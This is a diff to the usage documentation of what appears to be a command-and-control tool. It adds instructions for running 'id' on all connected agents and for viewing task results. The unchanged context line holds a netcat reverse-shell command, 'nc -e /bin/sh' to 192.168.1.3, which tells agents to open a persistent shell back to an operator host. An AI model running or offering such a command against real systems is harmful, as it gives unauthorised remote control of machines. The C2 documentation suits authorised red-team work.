@@ -112,6 +112,23 @@ task add 85913eb1245d40eb96cf53eaf0b1e241 c2-shell nc -e /bin/sh 192.168.1.3 444
 ```
 This way you will have a shell that even if you get disconnected it will get back up immediately. Only the interactive commands will make it die permanently.
 
+To instruct all the agents to run the command "id" you can do it like this:
+
+```
+# for all agents
+task add all c2-shell id
+
+# check the results of the "id"
+show result all
+```
+
+To check the history/ previous results of executed tasks for a specific agent do it like this:
+
+```
+# check the results of a specific agent
+show result 85913eb1245d40eb96cf53eaf0b1e241
+```
+
 You can also change the interval of the agents that checks for tasks to 30 seconds like this:
 
 ```
